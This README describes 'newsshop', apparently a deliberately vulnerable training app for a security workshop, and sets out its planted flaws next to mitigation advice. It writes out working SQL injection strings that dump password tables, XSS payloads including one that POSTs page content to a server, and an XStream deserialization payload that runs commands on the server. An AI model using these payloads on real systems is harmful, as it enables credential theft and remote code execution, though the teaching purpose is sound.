newsshop
========

## Included known vulnerabilities:

### SQL Injection
* `name` field is vulnerable to SQL Injection
  * in a first step the attacker might read all tables in the database with
    ```
    ' or 1=1 UNION SELECT 0,false, 'alle','',GROUP_CONCAT(TABLE_NAME SEPARATOR ', '),'' FROM INFORMATION_SCHEMA.TABLES;--
    ```
  * in a second step he may read the contents of `PASSWORD`
    ```
    ' or 1=1 UNION SELECT 0,false, 'passwörter','',GROUP_CONCAT(PASSWORD SEPARATOR ', '),'' FROM PASSWORD;--
    ```

### Cross Site Scripting
* `source` field is vulnerable to XSS
  ```
  <img src="a" onerror="alert('hacked')" />
  ```
### Legacy attributes in API
* the newsletter support more attributes than the newsletter form
  * the field `mailProperties` may be filled with JSON/HTML by using a rest client/or browser tools
  * the field `mailproperites` itself is vulnerable to XSS

### Invalid Supply Chain
* xstream in 1.4.6 contains a command injection vulnerability
  * `http://localhost:8080/api/newsletter/import` with payload
    ```
    <newsletter class='dynamic-proxy'>
        <interface>com.andrena.newsec.model.Newsletterable</interface>
        <handler class='java.beans.EventHandler'>
            <target class='java.lang.ProcessBuilder'>
                <command>
                    <string>calc.exe</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </newsletter>
    ```

### Privileges
* Admin and Users run in the same Application
* Database contains Newsletters but also Passwords from another team (that has nothing to do with newletters)

## Planned/Possible vulnerabilities:

### Regex Denial of Service
* some attribute of the newsletter could be validated with a regexp, that may expand in exponential time

### Broken serialization
* `mail properties` is at this time a json document with html contents. It may also be yaml. Maybe it can be used to inject a serialization vulnerability

### Reflected/DOM XSS
* the confirmation page/error page could embedded html in and unsafe way allowing XSS
  * depedent on the source of JS-Injectable 
    * url parameter => DOM XSS
    * result of the former api call => Reflected XSS

## Mitigation

### Validate Input

* Names need not contain double quotes
* Number input should be numeric
* JSON Input should be JSON
* Richtext may contain HTML, but only formatting, no links, no images, no iframes
* dropdowns should be in a list of options

### sanitize output to other systems

* For SQL use Prepared Statements or equivalents
  * Never use user dependent SQL Templates (whenever the template string cannot be proofed to be in a finite set of texts, this should be alerting)
* For Serialization limit the types of the result
  * Limiting to interfaces should be considered harmful (because these allow an infinite set of new sub classes)
* For Console Access
  * Limit to allowed commands

### Track the dependencies

* Update to the newest dependencies
* Check whether vulnerable dependencies are drawn
  * and check whether the vulnerable part is really depended on

### Control your privileges

* for databases
  * do not access the database with admin rights
  * restrict the user to exactly those tables that he needs (`grant ...`)
* in general
  * do not run with root privileges
    * unless really needed - an than return the privileges as soon as possible

### Content Security Policy

* not allowing onerrors to be defined in the page would prevent `<img onerror>` attacks

### more xss examples:
* Blind XSS (executed on admin page)
* send page content to other server
```
<iframe src="javascript:console.log('xss?', window.parent.document.body.innerHTML)"></iframe>

<iframe src="javascript:fetch('http://localhost:8080', {
  method: 'POST',
  body: window.parent.document.body.innerHTML
})
"></iframe>
```
* delete entries in table
```
<iframe src="javascript:window.parent.document.querySelector('.delete-btn').click()"></iframe>
```

### to be continued
* add XSS to confirmation page
* add OpenAPI 
* add old urls in the frontend code (to hint at mail properties?)

### Next steps:
* docker
* Struktur/Ablauf Workshop mit Secorvo, insbesondere die Inhalte (erstmal abwarten): Wie soll der Kurs laufen?
* Folien fertigstellen
* Tests für die Maßnahmen: Input Validation,...
* Hints: über Anwendung, Handouts, über Fragen während des Workshops (die kann man schon vorbereiten)


### how to get the participants to the attacks

* admin password can be guessed (should just be used to see the results of XSS and not as an attack)
* e-mail: enter same value twice
* sql: try the different input fields, start with '
* MailProperties: guess, try things out, admin dashboard

### complete fetch code for invalid supply chain on mac 
* post into browser console
```
fetch("http://localhost:8080/api/newsletter/import", {
headers: {
"accept": "application/json, text/plain, */*",
"authorization": "Basic YWRtaW46YWRtaW4=",
"cache-control": "no-cache",
"Content-Type": "application/xml"
},
referrer: "http://localhost:8080/subscribe.html",
referrerPolicy: "strict-origin-when-cross-origin",
body: `<newsletter class="dynamic-proxy">
        <interface>com.andrena.newsec.model.Newsletterable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>touch</string>
                    <string>mynewfile</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </newsletter>`,
method: "POST",
mode: "cors",
credentials: "include"
});
```

* connect to image and look for the generated file
```
$ docker exec -it newsshop-app-1 /bin/sh
/app # ls
```
